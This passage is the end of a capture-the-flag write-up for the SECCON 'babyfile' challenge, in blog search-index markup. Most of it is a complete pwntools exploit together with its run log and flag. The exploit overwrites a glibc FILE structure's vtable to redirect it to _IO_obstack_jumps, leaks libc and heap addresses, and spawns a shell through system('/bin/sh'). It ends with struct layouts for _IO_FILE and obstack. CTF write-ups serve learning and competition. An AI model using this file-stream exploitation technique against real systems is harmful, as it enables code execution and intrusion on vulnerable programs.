system(&quot;/bin/sh&quot;)</span></span><br></pre></td></tr></table></figure><h1 id="PROFIT"><a href="#PROFIT" class="headerlink" title="PROFIT"></a>PROFIT</h1><p>After optimizing a lot my exploit (my french connection sucks), here we are:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157</span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/seccon/babyfile/chall&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Opening connection to babyfile.seccon.games on port 3157: Done</span><br><span class="line">[*] libc: 0x7fe2bc538000</span><br><span class="line">[*] heap: 0x55fd27776000</span><br><span class="line">[*] _IO_obstack_jumps: 0x7fe2bc721260</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">SECCON&#123;r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3&#125;</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h1 id="Annexes"><a href="#Annexes" class="headerlink" title="Annexes"></a>Annexes</h1><p>Final exploit:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># this exploit was generated via</span></span><br><span class="line"><span class="comment"># 1) pwntools</span></span><br><span class="line"><span class="comment"># 2) ctfmate</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> pwn</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = pwn.context.binary = pwn.ELF(<span class="string">&#x27;chall&#x27;</span>)</span><br><span class="line">libc = pwn.context.binary = pwn.ELF(<span class="string">&#x27;libc-2.31.so&#x27;</span>)</span><br><span class="line">pwn.context.delete_corefiles = <span class="literal">True</span></span><br><span class="line">pwn.context.rename_corefiles = <span class="literal">False</span></span><br><span class="line"><span class="comment"># pwn.context.timeout = 1000</span></span><br><span class="line"></span><br><span class="line">host = pwn.args.HOST <span class="keyword">or</span> <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">port = <span class="built_in">int</span>(pwn.args.PORT <span class="keyword">or</span> <span class="number">1337</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        <span class="keyword">return</span> pwn.gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> pwn.process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span></span><br><span class="line">    io = pwn.connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> pwn.args.GDB:</span><br><span class="line">        pwn.gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Start the exploit against the target.&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pwn.args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">source /home/nasm/Downloads/pwndbg/gdbinit.py</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(**<span class="built_in">locals</span>())</span><br><span class="line"></span><br><span class="line">io = <span class="literal">None</span></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">File</span>:</span><br><span class="line">    flags          = <span class="number">0x0</span></span><br><span class="line">    _IO_read_base  = <span class="number">24</span></span><br><span class="line">    _IO_read_end   = <span class="number">0x10</span></span><br><span class="line">    _IO_write_base = <span class="number">0x20</span></span><br><span class="line">    _IO_write_ptr  = <span class="number">0x28</span></span><br><span class="line">    _IO_write_end  = <span class="number">0x30</span></span><br><span class="line">    _IO_buf_base   = <span class="number">0x38</span></span><br><span class="line">    _IO_buf_end    = <span class="number">0x40</span></span><br><span class="line">    fileno         = <span class="number">0x70</span></span><br><span class="line">    vtable         = <span class="number">0xd8</span></span><br><span class="line">    obstack       = <span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">obstack</span>:</span><br><span class="line">    chunkfun       = <span class="number">56</span></span><br><span class="line">    extra_arg      = <span class="number">56</span>+<span class="number">16</span></span><br><span class="line">    use_extra_arg  = <span class="number">56</span>+<span class="number">16</span>+<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fflush</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trick</span>(<span class="params">offt, data</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;offset: &quot;</span>, <span class="built_in">str</span>(offt).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;value: &quot;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leave</span>():</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span>, debug=<span class="literal">True</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> ptr[i]:</span><br><span class="line">            trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write2</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_write</span>(<span class="params">ptr: <span class="built_in">bytes</span>, offt: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        trick(offt + i, <span class="built_in">str</span>(ptr[i]).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_ptr</span>(<span class="params">ptr: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    write_ptr(ptr, File._IO_write_base)</span><br><span class="line">    </span><br><span class="line">    dest = (<span class="built_in">int</span>.from_bytes(ptr, byteorder=<span class="string">&quot;little&quot;</span>)+<span class="number">8</span>).to_bytes(<span class="number">8</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    write_ptr(dest, File._IO_write_ptr)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    ret = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># do_allocate</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa8</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># _IO_file_underflow =&gt; _IO_default_pbackfail</span></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x60</span>), File.vtable)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    int</span></span><br><span class="line"><span class="string">    _IO_default_pbackfail (FILE *fp, int c)</span></span><br><span class="line"><span class="string">    =&gt; not _IO_IN_BACKUP         0x0100</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_base == _IO_write_ptr</span></span><br><span class="line"><span class="string">    =&gt; _IO_read_end == _IO_write_ptr + 8</span></span><br><span class="line"><span class="string">    =&gt; _IO_write_end = right size</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(<span class="number">0xfbad1800</span> | <span class="number">0x8000</span>), File.flags)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x70</span>), File._IO_write_base)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0x78</span>), File._IO_write_ptr)</span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xa0</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(<span class="number">1</span>), File.fileno)</span><br><span class="line">    fflush()</span><br><span class="line"></span><br><span class="line">    leak = pwn.u64(io.recv(<span class="number">8</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x2160c0</span> + <span class="number">0x2d160</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;libc: <span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line">    libc.address = leak</span><br><span class="line"></span><br><span class="line">    leak_main_arena = leak + <span class="number">0x1ed5a0</span></span><br><span class="line"></span><br><span class="line">    heap = leak_ptr(pwn.p64(leak_main_arena)) - <span class="number">0x2a0</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;heap: <span class="subst">&#123;<span class="built_in">hex</span>(heap)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    _IO_obstack_jumps = leak + <span class="number">0x1E9260</span></span><br><span class="line">    pwn.log.info(<span class="string">f&quot;_IO_obstack_jumps: <span class="subst">&#123;<span class="built_in">hex</span>(_IO_obstack_jumps)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># edit vtable =&gt; _IO_obstack_jumps</span></span><br><span class="line">    write_ptr(pwn.p64(_IO_obstack_jumps - <span class="number">8</span> * <span class="number">9</span>), File.vtable)</span><br><span class="line">    write_ptr(pwn.p64(heap + <span class="number">0x2a0</span>), File.obstack)</span><br><span class="line"></span><br><span class="line">    partial_write(pwn.p8(<span class="number">0xff</span>), File._IO_read_base)</span><br><span class="line"></span><br><span class="line">    write_ptr(pwn.p64(libc.sym.system), obstack.chunkfun) <span class="comment"># fn ptr, system</span></span><br><span class="line">    write_ptr(pwn.p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))), obstack.extra_arg) <span class="comment"># arg</span></span><br><span class="line">    partial_write(pwn.p8(<span class="literal">True</span>), obstack.use_extra_arg)</span><br><span class="line"></span><br><span class="line">    fflush()</span><br><span class="line">    <span class="comment"># system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">b&quot;cat flag-f81d1f481db83712a1128dc9b72d5503.txt&quot;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">type = struct _IO_FILE &#123;</span></span><br><span class="line"><span class="string">/*      0      |       4 */    int _flags;</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*      8      |       8 */    char *_IO_read_ptr;</span></span><br><span class="line"><span class="string">/*     16      |       8 */    char *_IO_read_end;</span></span><br><span class="line"><span class="string">/*     24      |       8 */    char *_IO_read_base;</span></span><br><span class="line"><span class="string">/*     32      |       8 */    char *_IO_write_base;</span></span><br><span class="line"><span class="string">/*     40      |       8 */    char *_IO_write_ptr;</span></span><br><span class="line"><span class="string">/*     48      |       8 */    char *_IO_write_end;</span></span><br><span class="line"><span class="string">/*     56      |       8 */    char *_IO_buf_base;</span></span><br><span class="line"><span class="string">/*     64      |       8 */    char *_IO_buf_end;</span></span><br><span class="line"><span class="string">/*     72      |       8 */    char *_IO_save_base;</span></span><br><span class="line"><span class="string">/*     80      |       8 */    char *_IO_backup_base;</span></span><br><span class="line"><span class="string">/*     88      |       8 */    char *_IO_save_end;</span></span><br><span class="line"><span class="string">/*     96      |       8 */    struct _IO_marker *_markers;</span></span><br><span class="line"><span class="string">/*    104      |       8 */    struct _IO_FILE *_chain;</span></span><br><span class="line"><span class="string">/*    112      |       4 */    int _fileno;</span></span><br><span class="line"><span class="string">/*    116      |       4 */    int _flags2;</span></span><br><span class="line"><span class="string">/*    120      |       8 */    __off_t _old_offset;</span></span><br><span class="line"><span class="string">/*    128      |       2 */    unsigned short _cur_column;</span></span><br><span class="line"><span class="string">/*    130      |       1 */    signed char _vtable_offset;</span></span><br><span class="line"><span class="string">/*    131      |       1 */    char _shortbuf[1];</span></span><br><span class="line"><span class="string">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="string">/*    136      |       8 */    _IO_lock_t *_lock;</span></span><br><span class="line"><span class="string">/*    144      |       8 */    __off64_t _offset;</span></span><br><span class="line"><span class="string">/*    152      |       8 */    struct _IO_codecvt *_codecvt;</span></span><br><span class="line"><span class="string">/*    160      |       8 */    struct _IO_wide_data *_wide_data;</span></span><br><span class="line"><span class="string">/*    168      |       8 */    struct _IO_FILE *_freeres_list;</span></span><br><span class="line"><span class="string">/*    176      |       8 */    void *_freeres_buf;</span></span><br><span class="line"><span class="string">/*    184      |       8 */    size_t __pad5;</span></span><br><span class="line"><span class="string">/*    192      |       4 */    int _mode;</span></span><br><span class="line"><span class="string">/*    196      |      20 */    char _unused2[20];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                               /* total size (bytes):  216 */</span></span><br><span class="line"><span class="string">                             &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">struct obstack          /* control current object in current chunk */</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  long chunk_size;              /* preferred size to allocate chunks in */</span></span><br><span class="line"><span class="string">  struct _obstack_chunk *chunk; /* address of current struct obstack_chunk */</span></span><br><span class="line"><span class="string">  char *object_base;            /* address of object we are building */</span></span><br><span class="line"><span class="string">  char *next_free;              /* where to add next char to current object */</span></span><br><span class="line"><span class="string">  char *chunk_limit;            /* address of char after current chunk */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    PTR_INT_TYPE tempint;</span></span><br><span class="line"><span class="string">    void *tempptr;</span></span><br><span class="line"><span class="string">  &#125; temp;                       /* Temporary for some macros.  */</span></span><br><span class="line"><span class="string">  int alignment_mask;           /* Mask of alignment for each object. */</span></span><br><span class="line"><span class="string">  /* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="string">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="string">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line"><span class="string">  struct _obstack_chunk *(*chunkfun) (void *, long);</span></span><br><span class="line"><span class="string">  void (*freefun) (void *, struct _obstack_chunk *);</span></span><br><span class="line"><span class="string">  void *extra_arg;              /* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line"><span class="string">  unsigned use_extra_arg : 1;     /* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line"><span class="string">  unsigned maybe_empty_object : 1; /* There is a possibility that the current</span></span><br><span class="line"><span class="string">      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="string">      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="string">      a bigger chunk to replace it. */</span></span><br><span class="line"><span class="string">  unsigned alloc_failed : 1;      /* No longer used, as we now call the failed</span></span><br><span class="line"><span class="string">     handler on error, but retained for binary</span></span><br><span class="line"><span class="string">     compatibility.  */</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">nasm@off:~/Documents/pwn/seccon/babyfile$ time python3 exploit.py REMOTE HOST=babyfile.seccon.games PORT=3157</span></span><br><span class="line"><span class="string">[*] &#x27;/home/nasm/Documents/pwn/seccon/babyfile/chall&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Full RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[*] &#x27;/home/nasm/Documents/pwn/seccon/babyfile/libc-2.31.so&#x27;</span></span><br><span class="line"><span class="string">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="string">    RELRO:    Partial RELRO</span></span><br><span class="line"><span class="string">    Stack:    Canary found</span></span><br><span class="line"><span class="string">    NX:       NX enabled</span></span><br><span class="line"><span class="string">    PIE:      PIE enabled</span></span><br><span class="line"><span class="string">[+] Opening connection to babyfile.seccon.games on port 3157: Done</span></span><br><span class="line"><span class="string">[*] libc: 0x7fe2bc538000</span></span><br><span class="line"><span class="string">[*] heap: 0x55fd27776000</span></span><br><span class="line"><span class="string">[*] _IO_obstack_jumps: 0x7fe2bc721260</span></span><br><span class="line"><span class="string">[*] Switching to interactive mode</span></span><br><span class="line"><span class="string">SECCON&#123;r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3&#125;</span></span><br><span class="line"><span class="string">[*] Got EOF while reading in interactive</span></span><br><span class="line"><span class="string">$</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> nasm </tag>
            
            <tag> pwn </tag>
            
            <tag> linux </tag>
            
            <tag> file stream </tag>
            
            <tag> SECCON </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
